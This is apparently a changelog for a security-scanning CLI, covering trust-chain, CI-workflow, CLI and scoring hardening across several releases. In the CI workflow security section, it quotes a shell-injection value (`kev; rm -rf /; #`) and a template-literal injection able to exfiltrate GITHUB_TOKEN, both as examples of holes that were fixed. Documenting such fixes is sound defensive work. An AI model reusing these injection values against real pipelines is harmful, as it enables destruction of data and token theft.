- **`reattest` refuses missing `.sig` sidecar** unless `--force-replay` is supplied. A deleted sidecar previously hit the same silently-consumed path as a clean attestation; the drift verdict was meaningless. `--force-replay` records `sidecar_verify` + `force_replay: true` in the persisted body so the override is auditable.
- **`refresh-network` verifies the tarball's `manifest_signature`** before swapping in the new skill set. The previous swap only verified per-skill signatures and trusted the manifest itself unconditionally; a coordinated attacker who could rewrite the manifest envelope's `skills[].signature` field (without breaking individual skill-body crypto) passed the check. Swap now refuses on `invalid` OR `missing` (stricter than the post-install loader, which still degrades to warn-and-continue for legacy unsigned tarballs).
- **`verify-shipped-tarball` predeploy gate verifies the manifest envelope signature** in addition to per-skill bodies. Mirrors the post-install verifier so the publish-time gate catches manifest-level tampering before the tarball reaches operators.
- **`keys/EXPECTED_FINGERPRINT` consulted at every public-key load site**. `attest verify`, `reattest` (via `verifyAttestationSidecar`), and the attestation sign path now cross-check the loaded public key against the pinned fingerprint, refusing on mismatch. Honors `KEYS_ROTATED=1` for legitimate rotation; missing pin file warns and continues. Closes the previously-misleading note in the v0.12.16 entry — the pin was claimed at "every load site" but the bin/exceptd.js sites were not consulting it.
- **`manifest_signature.signed_at` removed** from the signed-bytes envelope. The field was excluded from the canonical input but included in the output object, letting an attacker replay a stale signature and rewrite the timestamp to lie about freshness. `manifest_signature` now carries `{algorithm, signature_base64}` only; consumers needing a freshness signal read git log or filesystem mtime.
- **`manifest_signature.algorithm` validated strictly** (`=== 'Ed25519'`). A missing field previously bypassed the algorithm guard; now refused unless the field is present and matches.
- **Unsigned-manifest warning deduplicated** via `process.emitWarning(..., { code: 'EXCEPTD_MANIFEST_UNSIGNED' })`. CLI verbs calling `loadManifestValidated` more than once per invocation no longer emit the warning N times.
- **Attestation sign + verify normalize CRLF/BOM**. All three attestation pipeline sites (`maybeSignAttestation`, `verifyAttestationSidecar`, `attest verify`) now apply the same `normalize()` contract as the manifest signer. Closes the CRLF-on-Windows divergence class that produced the v0.11.x signature regressions, now mirrored at attestation granularity.
- **Cross-implementation `normalize()` contract test** asserts byte-identical output across `lib/sign.js`, `lib/verify.js`, `lib/refresh-network.js`, `scripts/verify-shipped-tarball.js`, and `bin/exceptd.js#normalizeAttestationBytes` against a 16-input fuzz corpus (plain LF, CRLF, BOM+LF, BOM+CRLF, double BOM, embedded `\r`, mixed line endings, embedded nulls, empty string, unicode codepoints, fixed-point convergence).

### Engine + FP-check enforcement

- **Array-shape FP attestation rejected**. `signal_overrides: { '<indicator>__fp_checks': [true, true] }` (array) previously bypassed the gate: `typeof [] === 'object'` is true and index-string fallback `att[String(idx)]` matched the array indices. Arrays now land in the empty-attestation branch and every required FP check is treated as unsatisfied.
- **Agent-supplied `detection_classification: 'detected'` override blocked when any indicator is FP-downgraded**. The runner previously honored the override unconditionally; an agent could mark the run `detected` even though every indicator with `false_positive_checks_required[]` had unsatisfied checks. Substitution to `inconclusive` is now forced and a `classification_override_blocked` runtime_error records the attempted value, the substituted value, and the indicators driving the downgrade.
- **`normalizeSubmission` runtime errors reach `analyze.runtime_errors[]`**. The helper recorded validation errors (e.g. `signal_overrides_invalid` for non-object input) on its own scratch array but the engine never harvested them; the v0.12.14 promise that `runtime_errors[]` surfaces every validation failure was silently incomplete. Errors now splice into the run-level accumulator before the F1 evidence-hash digest, then the scratch property is deleted so the digest stays deterministic.

### Bundle correctness

- **CSAF + OpenVEX `fixed` status gated on `vex_status`, not `live_patch_available`**. The catalog's `live_patch_available` field means "vendor publishes a live-patch in the world" — NOT "operator has deployed it." Bundles were emitting `product_status: fixed` / OpenVEX `status: "fixed"` for every CVE in the catalog with a live-patch route, regardless of operator disposition. Now: `fixed` requires `c.vex_status === 'fixed'` (operator-supplied via `--vex`); live-patchable CVEs without an operator attestation emit `known_affected` / OpenVEX `affected` with `remediations[].category: vendor_fix` pointing at the live-patch.
- **SARIF `artifactLocation.uri` validates path shape**. The previous logic stripped `^https?://` and split on `AND|OR`, leaving shell commands like `uname -r` or English prose as the URI. GitHub Code Scanning rejected or rendered these garbled. A path-shape predicate now accepts POSIX absolute, home (`~`), relative dot, Windows drive, `file:` URI, and bare relative paths; rejects whitespace + shell metachars. Non-path sources omit `locations` cleanly.
- **CSAF framework gaps emitted as `document.notes[]`** instead of `vulnerabilities[]`. Framework-gap entries previously carried `ids: [{system_name: "exceptd-framework-gap"}]` — not a recognized vulnerability tracking authority. NVD / Red Hat dashboards saw 9 false-positive advisories per run. Now rendered as `notes[].category: "details"`.
- **`bundle_body` and `bundles_by_format` share timestamps**. `buildEvidenceBundle` was called twice in close(); each invocation minted independent `new Date().toISOString()` values, so `document.tracking.initial_release_date` (CSAF) and `timestamp` (OpenVEX) differed by milliseconds across the two bundle surfaces. A memoized build now produces one bundle reused at both call sites.
- **SARIF `invocations[0].properties` strips nulls**. Aligns with the rest of the SARIF emitter so consumer dashboards don't see `{ "exit_code": null }` noise.

### CLI hardening

- **Windows stdin auto-detect fixed**. `cmdRun` and `cmdIngest` used `process.stdin.isTTY === false` (strict equality). On Windows MSYS bash, `process.stdin.isTTY === undefined` for a piped stream, so the check failed and `echo '{...}' | exceptd run ...` was not picked up as evidence. Both call sites now use truthy `!process.stdin.isTTY` (parity with `cmdAiRun`).
- **`--vex` validates document shape on empty `vulnerabilities[]`**. The detect heuristic previously returned `entriesLookVex` true for any document with an empty `vulnerabilities` array — including `{"bomFormat":"NOT-CycloneDX","vulnerabilities":[]}`. Empty arrays now require `bomFormat === "CycloneDX"` OR `specVersion` starting with `1.`.
- **`--vex` enforces a 32 MB size cap**. `fs.statSync` check before `fs.readFileSync` matches the cap on `--evidence`.
- **`--scope ""` rejected with the accepted-set message** instead of silently auto-detecting. The gate changed from truthy `args.scope` to `args.scope !== undefined`, so empty string reaches `validateScopeOrThrow`.
- **`--since` validated against ISO-8601 regex BEFORE `Date.parse`** on `attest list` and `reattest`. `Date.parse("99")` returned 1999-12-01 (a legitimate-looking ISO-8601 short form). The regex now requires `YYYY-MM-DD` minimum.
- **Session-id validation runs before `findSessionDir`** in `cmdAttest`. Previously a regex-rejected id (e.g. `'../../..'`) and a valid-shape-but-not-found id both surfaced as "no session dir" — the validation error is now reported distinctly.
- **`--evidence-dir` refuses symbolic links** via `fs.lstatSync` check. Prior path-traversal guards covered string-resolved paths but symlinks pointing outside the directory followed transparently through `readFileSync`.
- **Three `process.exit(N)` sites after stderr writes** in the main dispatcher (unknown command, missing script, spawn error) replaced with `emitError()` + `process.exitCode = N; return;`. Stderr drains under piped CI consumers.
- **`buildJurisdictionClockRollup` output carries both `obligation` and `obligation_ref`**. The CHANGELOG previously claimed the dedupe key was `(jurisdiction, regulation, obligation, window_hours)` while the rollup body emitted `obligation_ref` only; both shapes now ship.

### Concurrency

- **`withCatalogLock` (refresh-external) and `withIndexLock` (prefetch) probe PID liveness** before falling through to the mtime-based stale-lock check. A lockfile written by a dead process is now reclaimed immediately (`process.kill(pid, 0)` → ESRCH → unlink). Matches the pattern already used in `orchestrator/index.js#_acquireWatchLock` and `lib/playbook-runner.js#acquireLock`.
- **`persistAttestation --force-overwrite` serialized via a lockfile**. Concurrent overwrites of the same path previously last-write-wins; the `prior_evidence_hash` chain lost intermediate writers. An `O_EXCL` lockfile gate at `<filePath>.lock` (with PID-liveness reclaim) now serializes the read-prior / write-new sequence.
- **`prefetch.js` payload staging atomic**. The fetcher previously wrote the cached payload before acquiring the index lock; a lock-acquisition timeout left orphan payload files with no index entry. Payload is now written to `<targetPath>.tmp.<pid>.<rand>` first; inside `withIndexLock` the rename + index update happen as an atomic pair; on lock-acquisition failure the tmp file is unlinked.
- **`scheduleEvery(0)` / `(-1)` / `(NaN)` rejected** with `RangeError`. Previously `scheduleEvery(0, fn)` fired ~93 times in 100 ms; negative values produced similar tight loops. `Number.isFinite(intervalMs) && intervalMs > 0` is now required.

### Auto-discovery + curation

- **KEV-discovered drafts now promotable**. `buildKevDraftEntry` previously stored `rwep_factors` with boolean values (the input shape for `scoreCustom`) plus `source_verified: null` — both shapes violated the strict catalog schema, hard-failing promotion. Drafts now carry post-weight numeric `rwep_factors` (matching the catalog norm) summing to `rwep_score` exactly, and `source_verified: <today>` (the KEV listing IS the verification source).

### Operator-facing factual

- **README CVE-2025-53773 CVSS aligned to catalog** (7.8, not 9.6). The catalog correction landed in v0.12.14 across 11 skills; the README example was missed.

### Predeploy

- **`Validate playbooks` gate caps informational exit at 1** via `informationalMaxExitCode: 1`. A CRASH (137/139) now surfaces as a real failure instead of being demoted to informational, matching the forward-watch gate's existing ceiling.

### Catalog

- **`ai-api` playbook `domain.cve_refs` += `CVE-2026-42208`** (cited in threat_context, was missing from the structured refs).

### Tests

- New: `tests/normalize-contract.test.js`, `tests/bundle-correctness.test.js`, `tests/_helpers/concurrent-attestation-writer.js`, plus new audit-fixes coverage.
- Touched: `tests/predeploy-gates.test.js` (gate-14 fixture signs the manifest envelope so per-skill verify still runs against tamper variants); `tests/operator-bugs.test.js` (framework-gap assertion updated to the new `document.notes[]` contract); `tests/auto-discovery.test.js` (KEV-draft schema-shape + active_exploitation enum + source_verified date).

## 0.12.18 — 2026-05-14

**Patch: e2e scenarios attest FP-check satisfaction for indicators that carry `false_positive_checks_required[]`.**

Four e2e scenarios assert `classification: detected` against indicators whose v0.12.17 FP-check backfill now requires explicit operator attestation. Without the attestation, the engine downgrades hits to `inconclusive` and the scenarios' RWEP thresholds aren't met. The scenarios now carry the attestation shape:

- `12-crypto-codebase-md5-eol`: attest FP checks for `weak-hash-import` + `no-ml-kem-implementation`
- `15-cred-stores-aws-static`: attest FP checks for `aws-static-key-present`
- `16-containers-root-user`: attest FP checks for `dockerfile-runs-as-root`; `adjusted` threshold lowered from 15 → 10 (only `dockerfile-from-latest` carries an `rwep_inputs` entry on the containers playbook; the FP-attested `dockerfile-runs-as-root` fires but doesn't drive RWEP)
- `20-ai-api-openai-dotfile`: attest FP checks for `cleartext-api-key-in-dotfile` + `long-lived-aws-keys`

Attestation shape per the E1 contract: `signal_overrides: { '<indicator>__fp_checks': { '0': true, '1': true, ... } }` — each entry means "I've verified that this FP scenario does NOT apply; this is a real hit."

## 0.12.17 — 2026-05-14

**Patch: manifest signing, Windows ACL on signing key, indicator FP-check backfill, schema promotion.**

### Manifest signing

The previous trust chain signed each skill body individually but the manifest itself was just an unsigned index. A coordinated attacker who could rewrite `manifest.json` + `manifest-snapshot.json` + `manifest-snapshot.sha256` passed every gate (snapshot is checked locally, the sha256 also computed locally).

Now: `manifest.json` carries a top-level `manifest_signature` field (Ed25519 over canonical sort-keys representation with the signature field excluded and `normalize()`-applied bytes). `lib/sign.js sign-all` and `lib/sign.js sign-skill` both re-sign the manifest after per-skill work; `lib/verify.js loadManifestValidated()` verifies the manifest signature before iterating skills. Tampered manifest entries (path swap, signature substitution) now fail the manifest-level check. Missing `manifest_signature` field emits a warning but doesn't block (backward-compat for legacy tarballs in the wild).

Canonical-form contract documented in both `lib/sign.js` and `lib/verify.js` headers — future shape changes to manifest.json must respect the invariants (sort top-level keys, exclude `manifest_signature`, normalize line endings).

### Windows ACL on `.keys/private.pem`

`lib/sign.js` previously wrote the private key with `{ mode: 0o600 }`. On POSIX this restricts read access to the owner. On Windows the `mode` argument maps to read/write attributes only, not POSIX permissions; ACLs inherited from the parent directory. A multi-user maintainer workstation or shared CI runner therefore allowed any process under the same desktop user to read the key. Now: on `win32`, `lib/sign.js` calls `icacls /inheritance:r /grant:r ${USERNAME}:F` after writing the private key, narrowing the ACL to the current user. The same restriction is applied via `restrictWindowsAcl(targetPath)` from `scripts/bootstrap.js` when bootstrap creates the keypair. Falls back to a stderr warning if `icacls` is unavailable; doesn't fail key generation.

### Indicator FP-check backfill

36 deterministic indicators across 11 playbooks now carry `false_positive_checks_required[]` entries (the gold-standard pattern from `library-author.gha-workflow-script-injection-sink` in v0.12.13). Per-playbook coverage:

- `ai-api` — 4 indicators (cleartext-api-key-in-dotfile, long-lived-aws-keys, gcp-service-account-json, kubeconfig-with-static-token)
- `containers` — 4 (dockerfile-runs-as-root, dockerfile-curl-pipe-bash, compose-cap-add-sys-admin, compose-host-network)
- `cred-stores` — 3 (aws-static-key-present, docker-cleartext-auth, credentials-file-bad-perms)
- `crypto-codebase` — 3 (weak-hash-import, weak-cipher-mode, tls-old-protocol)
- `crypto` — 2 (ml-dsa-slh-dsa-absent, openssl-pre-3-5)
- `framework` — 3 (exception-missing-expiry-or-owner, jurisdiction-without-framework, compound-theater)
- `hardening` — 4 (kptr-restrict-disabled, yama-ptrace-permissive, kaslr-disabled-at-boot, mitigations-off)
- `kernel` — 2 (unpriv-userns-enabled, unpriv-bpf-allowed)
- `mcp` — 3 (mcp-response-ansi-escape, mcp-response-unicode-tag-smuggling, mcp-server-running-as-root)
- `runtime` — 3 (duplicate-uid-zero, world-writable-in-trusted-path, orphan-privileged-process)
- `sbom` — 3 (lockfile-no-integrity, kev-listed-match, windsurf-vulnerable-version)
- `secrets` — 5 (aws-secret-access-key, slack-bot-or-user-token, stripe-secret-key, openai-api-key, anthropic-api-key)

Each entry is a 1-line check an AI assistant or operator must satisfy before the indicator's `hit` verdict can drive `classification: detected`. The runner downgrades a hit with unsatisfied FP checks to `inconclusive` (E1 contract from v0.12.12). Binding FP checks per-indicator at the schema layer complements the playbook-level `false_positive_profile[]` documentation.

### Schema promotion

`lib/schemas/playbook.schema.json` indicator object now formally declares `false_positive_checks_required[]` and `cve_ref` as optional fields (was unschema'd; produced WARN noise on every validate run). The `cve_ref` field has been load-bearing since v0.12.14 (drives `analyze.matched_cves[]` correlation); the schema declaration catches up. `validate-playbooks` runs 13/13 PASS with zero warnings.

### Operator-facing surfaces

- **`--diff-from-latest` result surfaced in `run` human renderer**. Operators running with `--diff-from-latest` and no `--json` previously got no visibility on drift; now: `> drift vs prior: unchanged (same evidence_hash as session <prior_id>)` or `> drift vs prior: DRIFTED — evidence_hash differs from session <prior_id>` is added near the classification line. No line when there's no prior attestation for the playbook.
- **`ai-run` stdin acceptance contract documented in `--help`**. The streaming + no-stream paths both consume "first parseable evidence event wins on stdin; subsequent evidence events ignored; non-evidence chatter silently ignored; invalid JSON exits 1." Was implicit behavior; now explicit.

### Auto-discovery hygiene

`lib/auto-discovery.js discoverNewKev` previously hardcoded `severity: 'high'` on every KEV-discovered diff. Now uses `deriveKevSeverity(kevEntry)` — returns `'critical'` when `knownRansomwareCampaignUse === 'Known'` OR `dueDate` is within 7 days; otherwise `'high'`. Downstream PR-body categorization can now route ransomware-use + imminent-due-date KEVs differently.

## 0.12.16 — 2026-05-14

**Patch: trust chain hardening, CI workflow injection sinks, CLI fuzz fixes, scoring math, curation + auto-discovery + prefetch fixes, playbook hygiene.**

### Sign/verify trust chain

- **CRLF/BOM bypass on the shipped-tarball verify gate closed.** `scripts/verify-shipped-tarball.js` previously read raw on-disk bytes and called `crypto.verify` directly — bypassing the CRLF/BOM normalization that `lib/sign.js` + `lib/verify.js` apply on both sides of the byte-stability contract. The gate's whole purpose is to catch the v0.11.x signature regression class; without the same normalization, it would itself report 0/38 on any tree where line-ending normalization touched the source between sign and pack (a Windows contributor with `core.autocrlf=true`, or any tool like Prettier in the CI pipeline). The `normalizeSkillBytes` helper is now mirrored in this fourth normalize() implementation.
- **`keys/EXPECTED_FINGERPRINT` pin now consulted at every public-key load site.** Previously only `lib/verify.js` + `scripts/verify-shipped-tarball.js` checked the pin. `lib/refresh-network.js` and `bin/exceptd.js attest verify` both loaded `keys/public.pem` and trusted it without the cross-check. A coordinated attacker who tampered with `keys/public.pem` on the operator's host (e.g. via a prior compromised refresh) passed every check because the local↔tarball fingerprints matched each other. Now the pin is the external trust anchor at all four load sites. Honors `KEYS_ROTATED=1` env to allow legitimate rotation without re-bootstrap; missing pin file degrades to warn-and-continue.

### CI workflow security

- **`atlas-currency.yml` script-injection sink closed (CWE-1395).** `${{ steps.currency.outputs.report }}` was interpolated directly into a github-script template literal; the `report` value is unescaped output of `node orchestrator/index.js currency`. A skill author who landed a string containing a backtick followed by `${process.exit(0)}` (or worse, an exfil to a webhook with `${process.env.GITHUB_TOKEN}`) got arbitrary JS execution inside the github-script runtime with the workflow's token. Now routed via `env.REPORT_TEXT` and read inside the script body as `process.env.REPORT_TEXT`.
- **`refresh.yml` shell-injection from `workflow_dispatch` input closed (CWE-78).** `${{ inputs.source }}` was interpolated directly into a bash `run:` block. An operator passing `kev; rm -rf /; #` got shell injection inside the runner. Now routed via `env.SOURCE_INPUT` and validated against `^[a-z,]+$` (the documented `kev,epss,nvd,rfc,pins` allowlist shape) before passing to the CLI.
- `actions/checkout` SHA comments aligned across `ci.yml`/`release.yml`/`scorecard.yml` (no SHA change; comment-only).
- `secret-scan` job declares explicit `permissions: contents: read` (survives a future repo visibility flip).
- `gitleaks` resolver now has a hardcoded fallback version + non-fatal failure path so a GitHub API HTML-error response doesn't block every CI run.
- New `tests/workflows-security.test.js` enforces: no `${{ steps.*.outputs.* }}` inside github-script template literals; no `${{ inputs.* }}` inside bash `run:` blocks; every third-party action is SHA-pinned; every workflow declares `permissions:`.

### CLI hardening

- **`--block-on-jurisdiction-clock` now honored on `cmdRun`.** Previously the flag was registered + documented but only `cmdCi` consumed it; `run --block-on-jurisdiction-clock` exited 0 even when an NIS2 24h clock had started. Now both verbs exit 5 (`CLOCK_STARTED`) when any notification action has a non-null `clock_started_at` and an unacked operator consent.
- **`cmdIngest` auto-detects piped stdin.** Mirrors the `cmdRun` shape — `echo '{...}' | exceptd ingest` now works without an explicit `--evidence -`.
- **`--vex` validates document shape before applying.** Previously any malformed JSON (SARIF, SBOM, CSAF advisory by mistake) resulted in a silent empty filter; now CycloneDX (`vulnerabilities[]` or `bomFormat: 'CycloneDX'`) or OpenVEX (`statements[]` + `@context` on openvex.dev) shape required before the filter is consumed.
- **`cmdReattest` verifies the `.sig` sidecar** before consuming the prior attestation. A tampered attestation is no longer silently consumed for the drift verdict. `--force-replay` available for legitimate ack-of-divergence.
- **`--operator <name>` validated**: rejects ASCII control chars + newlines; caps length at 256; rejects all-whitespace. Closes the "multi-line operator forgery" surface in CSAF / attest export rendering.
- **`--diff-from-latest` result surfaced in human renderer**: operators running with `--diff-from-latest` and no `--json` now see a `> drift vs prior: <status>` line.
- **Cross-playbook jurisdiction clock rollup** in `cmdRunMulti` / `cmdCi`: deduped by `(jurisdiction, regulation, obligation, window_hours)`, `triggered_by_playbooks[]` lists contributors. Operators running 13 playbooks no longer draft 8 separate NIS2 24h notifications.
- `--block-on-jurisdiction-clock` exit code split from `FAIL` (exit 2) → `CLOCK_STARTED` (exit 5). CI gates can distinguish "detected" from "clock fired".
- `cmdReattest --since` validated as parseable ISO-8601.

### Scoring math hardening

- `scoreCustom` now treats `active_exploitation: 'unknown'` as `0.25 × weight` (was 0) — aligning with `playbook-runner._activeExploitationLadder` semantics so catalog-side and runtime-side scoring agree.
- New `deriveRwepFromFactors(factors)` helper exported; detects whether `rwep_factors` is in Shape A (boolean inputs to `scoreCustom`) or Shape B (numeric weighted contributions) and produces a consistent score. Documents the dual-semantics so the rename can land cleanly in v0.13.0.
- `validateFactors` NaN/Infinity diagnostics now use `Number.isFinite` with dedicated messages (was misleading "expected number, got number (null)").
- `validateFactors` flags unknown factor keys ("unknown factor: X (ignored)").
- `scoreCustom(factors, {collectWarnings: true})` returns `_rwep_raw_unclamped` so operators see deduction magnitude even when the floor clamp absorbs negative weights.
- `compare()` "broadly aligned" band tightened from ±20 to ±10. The Copy Fail RWEP-vs-CVSS divergence (delta 12) now correctly surfaces as "significantly higher than CVSS equivalent."
- `Math.floor(20/2)` arithmetic replaced with `RWEP_WEIGHTS.active_exploitation * 0.5` (no behavior change today; closes a future odd-weight asymmetry).

### Curation + auto-discovery + prefetch

- **Hidden second scoring path in `lib/cve-curation.js` closed.** The apply path previously derived `rwep_score` via `Object.values(rwep_factors).reduce(sum, 0)` — bypassing `scoring.js` entirely. Replaced with `deriveRwepFromFactors()`.
- **Auto-discovery RWEP divergence closed.** `lib/auto-discovery.js` previously stored `rwep_factors` with null values for poc_available/ai_*/reboot_required while calling `scoreCustom` with `true` defaults; stored factors and stored score were inconsistent and `scoring.validate()` always flagged it. New `buildScoringInputs(kev, nvd)` is the single source of truth.
- **`lib/prefetch.js` GITHUB_TOKEN now reaches the request.** The auth lookup keyed off source name `"github"` but the registered source is `"pins"` — anonymous rate-limit applied even when `GITHUB_TOKEN` was set. Fixed.
- **`lib/prefetch.js` docs corrected**: header comment + `printHelp()` no longer reference non-existent source names `ietf` and `github`.
- **`readCached` no longer returns stale data as fresh** when `fetched_at` is missing/corrupt (the `NaN > maxAgeMs === false` short-circuit was treating undefined-age entries as eternally-fresh).

### Playbook quality

- **Mutex reciprocity validator** in `lib/validate-playbooks.js`: walks every `_meta.mutex` entry, emits WARNING per asymmetric edge. Reciprocity backfilled across 7 mutex relationships (secrets↔library-author, kernel↔hardening, containers↔library-author, etc.).
- **`containers → sbom` feeds_into edge** added (container-image-layer SBOM matching against KEV-listed CVEs is a primary v0.12.x use case but wasn't declared).
- **Domain CVE refs backfilled** where threat_context cited CVEs without referencing them: `runtime.cve_refs += CVE-2026-31431`, `ai-api.cve_refs += CVE-2026-30615`. `containers` threat_context's stale `CVE-2024-21626` (not in catalog) stripped.
- **ATLAS refs backfilled**: `cred-stores.atlas_refs += AML.T0055` (Unsecured Credentials), `containers.atlas_refs += AML.T0010` (ML Supply Chain).
- **Artifact type enum drift normalized**: 19 occurrences across crypto-codebase / crypto / library-author / mcp / sbom of `"file_path"` and `"log_pattern"` rewritten to the schema enum (`"file"` / `"log"`).
- **Indicator type enum drift normalized**: 3 occurrences in `library-author` of `"api_response"` rewritten to `"api_call_sequence"`.
- **FP-check backfill** on library-author indicators (publish-workflow-action-refs-mutable + tag-protection-absent) — gold-standard pattern from `gha-workflow-script-injection-sink` extended to two more high-confidence indicators.

### Repository

- `data/cve-catalog.json` synthetic test-pollution entry (`CVE-9999-99999`) removed (left by a test run that used the real catalog path).
- 29 new RWEP vector regression tests in `tests/scoring-vectors.test.js`.
- 8 new workflow-security regression tests in `tests/workflows-security.test.js`.
- `validate-playbooks.js` now reports 12/13 PASS + 1 WARN (was 8 PASS + 5 WARN before normalization).

## 0.12.15 — 2026-05-14

**Patch: RWEP factor-scaling three-tier fallback + silent-disable regression closures.**

The v0.12.14 RWEP factor-scaling change had no fallback for class-of-vulnerability playbooks that detect without per-CVE evidence correlation. `_factorScale` returned 0 when no `factorCve` was available, forcing `weight_applied` to 0 and emitting `adjusted: 0` for every detection on catalog-shape playbooks (`secrets`, `library-author`, `crypto-codebase`, `framework`, `cred-stores`, `containers`, `runtime`, `crypto`, `ai-api`).

### Engine: class-of-vulnerability RWEP fallback

`lib/playbook-runner.js` factor-scaling now has a three-tier fallback:

1. **Evidence-correlated CVE** (`factorCve from matchedCves[0]`): scale by the matched CVE's catalog attributes (v0.12.14 F5 semantics — `cisa_kev` weight only when the matched CVE actually has `cisa_kev: true`, etc.).
2. **Domain-CVE fallback** (`factorCve from playbook.domain.cve_refs[]`): when no evidence correlation but the playbook declares its threat class via `domain.cve_refs[]`, use the highest-RWEP catalog entry from those refs.
3. **Class fallback** (no domain CVE either): apply the declared weight as-is (`factor_scale = 1`), mirroring pre-v0.12.14 behaviour. Class-of-vulnerability playbooks that detect without CVE anchoring (e.g. `secrets`, `library-author`) get a sensible default while still honoring an operator-supplied `blast_radius_score` when present.

The breakdown emits `factor_cve_source: 'evidence' | 'domain' | 'class'` so operators see which tier the run used.

### Silent-disable regression closures

Three prior fixes were silently dead:

- **`lib/cve-curation.js loadCveEntrySchema()`** always returned `null` because the function looked for `root.patternProperties["^CVE-\\d{4}-\\d+$"]` or an object `root.additionalProperties`, but `lib/schemas/cve-catalog.schema.json` has neither — its top level IS the entry shape. The strict-schema gate on draft promotion never fired; schema-violating entries promoted anyway. Now uses the root schema directly.
- **`lib/cve-curation.js loadJson("data/attack-ttps.json")`** referenced a path that doesn't exist (canonical is `data/attack-techniques.json`). `loadJsonRaw` swallowed the ENOENT and cached `null`, so the ATT&CK candidate-ranking branch in the curation questionnaire always returned zero proposals. Path corrected.
- **`lib/auto-discovery.js _auto_imported`** wrote object-shape provenance (`{source, imported_at, curation_needed}`) but `lib/validate-cve-catalog.js` checks `entry._auto_imported === true` (strict identity). KEV-discovered drafts were treated as production-grade entries instead of warning-tier drafts, hard-failing the strict catalog gate. Now writes the boolean `true` with provenance moved to a sibling `_auto_imported_meta` field. `source_verified: false` (boolean) violated the schema's `YYYY-MM-DD | null` shape — now `null`. Template literal bug on the RFC errata URL hint also fixed (was printing literal `${number}` to operators).

### Scoring math hardening

- `scoreCustom` now rejects `NaN` / `Infinity` / stringified-number `blast_radius` cleanly via `Number.isFinite(Number(blast_radius))`. The prior `typeof === 'number'` check accepted `NaN` (which IS `typeof === 'number'`) and propagated it through `Math.min/max` to the final return — defeating the `[0, 100]` clamp contract.
- `scoreCustom` now accepts either `reboot_required` or the catalog's `patch_required_reboot` field name. The catalog stores `patch_required_reboot`; `scoreCustom` expected `reboot_required`. `validate()` aliased at the call site, but a direct caller passing the catalog entry silently lost the reboot factor.
- Defense-in-depth: the final clamp now rejects non-finite scores explicitly (`Number.isFinite(score) ? clamp : 0`).

### CLI fuzz fixes

- `--scope <invalid>` now produces a structured error instead of silently producing zero results. The prior shape: `run --scope nonsense` returned `count: 0` + `ok: true` + exit 0; `ci --scope nonsense` silently ran only the cross-cutting set (`framework`) with `verdict: PASS`. Both validated as operator-intent loss patterns. Accepted scope set: `system | code | service | cross-cutting | all`.

## 0.12.14 — 2026-05-14

**Patch: hardening across trust chain, engine, refresh sources, orchestrator/watch, predeploy gates, catalogs, and skill content.**

### Trust chain (lib/refresh-network.js)

The `exceptd refresh --network` path was effectively unsigned-code-delivery. The signature loop iterated `sk.id` (not exposed on manifest entries) and a fixed payload path `skills/<id>/SKILL.md` (uppercase, while the manifest's path is `skills/<name>/skill.md` lowercase). Result: `0/38 signatures verified` across every operator pulling the network refresh. The `failures.length === 0` short-circuit then allowed `ok: true` to ship.

Now: manifest entries iterated by `name` + `path` + `signature`, mirroring `lib/verify.js`. CRLF + BOM normalization applied before verify — Windows-`core.autocrlf=true` contributors produce signatures that round-trip stably through the network refresh. Manifest paths validated with the same regex-and-resolve check the source-tree verifier uses. The swap also enforces that every `skills/*/skill.md` entry shipped in the tarball is declared in the manifest — a tarball-vs-manifest divergence now refuses the swap.

Integrity: SHA-512 SRI from `dist.integrity` is verified first (collision-resistant beyond SHA-1 reach), then SHA-1 `dist.shasum` for compatibility. `dist.signatures[]` count is now surfaced. A 200 MB tarball size cap (overridable via `EXCEPTD_TARBALL_SIZE_CAP_BYTES`) is enforced during download.

Atomic swap rewritten with two-phase semantics: backup-all-targets THEN install-all-targets, with reverse-walk rollback on mid-swap failure. Backup-dir suffix uses `${process.pid}-${randomBytes(4)}` so concurrent invocations don't collide on the millisecond clock.

### Engine semantics (lib/playbook-runner.js)

- `evidence_hash` now incorporates a canonicalized SHA-256 over the operator's submission (observations, signal_overrides, signals — sorted keys recursively). Previously it hashed only `(playbook, directive, matched_cves, rwep, classification)`, so two materially different submissions producing the same classification were indistinguishable; `reattest` couldn't detect drift. A `submission_digest` sibling field is also surfaced for downstream consumers.
- `run()` generates `session_id` once and threads it through close() and into CSAF tracking.id + OpenVEX @id + product PURLs. Previously close() and the bundle emitters each minted independent ids, so an attestation file at `.exceptd/attestations/<run-id>/attestation.json` couldn't be correlated to the bundle URN inside it.
- Indicator-level `cve_ref` is now load-bearing: when an indicator hits and declares a `cve_ref`, the catalog entry is pulled into `analyze.matched_cves[]` with `correlated_via: 'indicator_cve_ref:<id>'`. Previously the field was dead data — `library-author`'s `gha-workflow-script-injection-sink` had a `cve_ref: "MAL-2026-3083"` that never reached matched_cves.
- `analyzeFindingShape` now emits a derived `severity` from `rwep_adjusted` (critical >= 80, high >= 50, medium >= 20, low). Nine shipped playbooks reference `finding.severity` in `feeds_into` / `escalation_criteria`; those conditions were dead until now.
- RWEP `rwep_factor` semantics implemented. Previously the runner applied every weight whenever the named indicator hit — every kernel-LPE hit jumped to RWEP 100 regardless of whether the matched CVE was KEV-listed or had `active_exploitation: confirmed`. Each factor now scales by the first matched CVE's corresponding catalog attribute (`cisa_kev`, `active_exploitation` enum, `poc_available`, `ai_factor`, `patch_available`, etc.). Breakdown surfaces `weight_declared` + `factor_scale` + `weight_applied`.
- `blast_radius_score`: no signal → `null` (was: first rubric entry's score, which encoded "best case"); supplied → validated in `[0, 5]`; out-of-range → null + `blast_radius_signal: 'rejected'` + runtime_error.
- Corrupt `data/cve-catalog.json` no longer crashes the runner uncaught at require-time. `lib/cross-ref-api.js` catches JSON parse failures, records them in a `_loadErrors[]` array, and returns a degraded empty catalog. `run()` surfaces `{ok:false, blocked_by:'catalog_corrupt', error: ...}` instead of throwing.
- Unknown `directiveId` now returns `{ok:false, blocked_by:'directive_not_found', valid_directives:[...]}` instead of throwing inside analyze().
- VEX `fixed` / CycloneDX `resolved` no longer conflated with `not_affected`. Fixed CVEs are retained in `matched_cves` with a `vex_status: 'fixed'` annotation and excluded from driving RWEP base — operators tracking residual-risk for partially-deployed patches see them; the score doesn't double-count.
- `analyze.active_exploitation` reduces worst-of-N across matched CVEs (was first-match).
- `interpolate()` surfaces unresolved `${var}` placeholders as `<MISSING:var>` and emits `missing_interpolation_vars[]` on each notification record. Previously the literal `${var}` reached operator-facing regulator notification drafts.
- `signal_overrides` non-object input (string, array, number) rejected; previously a string `"HELLO"` spread character-by-character producing phantom indicator overrides.
- Unknown bundle format no longer leaks `analyze` + `validate` internals via a fallback `{format, note, analyze, validate}` — returns supported-formats list instead.
